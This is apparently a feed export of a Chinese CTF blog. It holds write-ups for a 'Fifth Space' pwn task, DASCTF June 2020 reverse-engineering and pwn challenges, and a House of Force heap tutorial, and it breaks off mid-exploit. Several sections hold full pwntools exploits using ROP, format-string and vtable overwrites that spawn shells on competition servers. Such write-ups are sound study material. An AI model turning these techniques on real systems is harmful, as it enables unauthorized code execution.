ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &quot;1&quot; * 0x57 + &#39;a&#39;sla(&quot;&gt;&quot;,payload)ru(&#39;a&#39;)canary = uu64(r(8)) - 0x0aprint(hex(canary))s_base = uu64(r(6)) - 0x70print(hex(s_base))  pop_rsi_pop_r15_ret = 0x0000000000400921pop_rbp_ret = 0x0000000000400690pop_rdi_ret = 0x0000000000400923leave_ret = 0x0000000000400879rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)# debug()sa(&quot;&gt;&quot;,payload)r(1)libc_base = uu64(r(6)) - libc.symbols[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&quot;&gt;&quot;,&#39;1&#39;)ru(&#39;1&#39;)rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1])sla(&quot;&gt;&quot;,payload)itr()</code></pre><ul><li>注意在第二次发送payload不要发出去换行符。</li><li>最后一次payload 中的rop什么的都是抄第一次的payload，只是把最后的ret address 改成 one gadget 。（只是填充字节用的）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;“第五空间”-智能安全大赛&quot;&gt;&lt;a href=&quot;#“第五空间”-智能安全大赛&quot; class=&quot;headerlink&quot; title=&quot;“第五空间” 智能安全大赛&quot;&gt;&lt;/a&gt;“第五空间” 智能安全大赛&lt;/h1&gt;&lt;p&gt;比赛时当天有考试，就做了个签道题。&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(6th)</title>
    <link href="http://chumen77.xyz/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <id>http://chumen77.xyz/2020/06/27/DASCTF安恒月赛(6th)/</id>
    <published>2020-06-27T14:27:37.170Z</published>
    <updated>2020-06-28T12:43:13.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p><h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>这里面需要注意的就是开头的：</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>其中这种二进制字节码对应的翻译结果：</p><pre><code>0x64 操作为LOAD_CONST，用法举例：LOAD_CONST 1        HEX: 6401000x71 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE 14                HEX: 710e000x65 操作为LOAD_NAME，用法举例：LOAD_NAME 1                HEX: 650100</code></pre><p>所以寻找：</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>那很明显混淆字段就是：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>然后用工具删除即可，其中0x97就是<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p><h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>反编译后这题就十分简单了。</p><p>给的字符串把“a”，去除后解码base64即可。</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5一下即可。</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sla(&quot;input&quot;,&quot;1&quot;)sla(&quot;input&quot;,&quot;2&quot;)sla(&quot;input&quot;,&quot;3&quot;)sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)sleep(0.1)ru(&quot;0x&quot;)tag = int(r(12),16) - 0xe0ru(&quot;AAAA0x&quot;)libc_base = int(r(12),16) -0x21b97info_addr(&quot;libc_base&quot;,libc_base)key1 = hex(tag)[-4:]print(key1)payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))sla(&quot;input&quot;,payload)sleep(5)rec = rce18[1] + libc_basekey2 = hex(rec)[-4:]print(key2)payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))sla(&quot;input&quot;,payload)sleep(5)key3 = int(hex(tag)[-2:],16) + 2print(key3)payload = &#39;%{}c%13$hhn&#39;.format(key3)sla(&quot;input&quot;,payload)sleep(5)key4 = hex(rec)[-6:-4]print(key4)payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))sla(&quot;input&quot;,payload)itr()# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)# 0008| 0x7fffffffe2f8 --&gt; 0x55554780# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)# 0048| 0x7fffffffe320 --&gt; 0x1# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)# 0080| 0x7fffffffe340 --&gt; 0x0# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1# 0112| 0x7fffffffe360 --&gt; 0x0# 0120| 0x7fffffffe368 --&gt; 0x0# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42# 0144| 0x7fffffffe380 --&gt; 0x0# 0152| 0x7fffffffe388 --&gt; 0x0# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</code></pre><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p><p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p><h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable 函数 指针：</p><pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};</code></pre><p>对于攻击的vtable 函数 指针其中的：</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p><h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p><p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p><p>正是因为可以写，所以这个题难度就降低了很多。</p><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p><h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-6th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-6th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(6th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(6th)&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#R
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="http://chumen77.xyz/2020/05/13/House%20of%20Force/"/>
    <id>http://chumen77.xyz/2020/05/13/House of Force/</id>
    <published>2020-05-13T13:30:55.952Z</published>
    <updated>2020-06-28T01:07:28.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li></ul><p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p><pre><code>// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p><h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。</p><p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p><h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li><li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li><li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25784)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;item name:&#39;,str(size))    sa(&#39;item&#39;,str(content))def free(id):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;item&#39;,str(id))def show(id):    sla(&#39;choice&#39;,&#39;1&#39;)def edit(id,size,content):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;item&#39;,str(id))    sla(&#39;item name&#39;,str(size))    sa(&#39;item&#39;,str(content))context.log_level = &#39;debug&#39;magic = 0x400d49add(0x30,&#39;chum&#39;)payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,&#39; &#39;)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload)# sla(&#39;choice:&#39;,&#39;5&#39;)itr()</code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;local_file  = 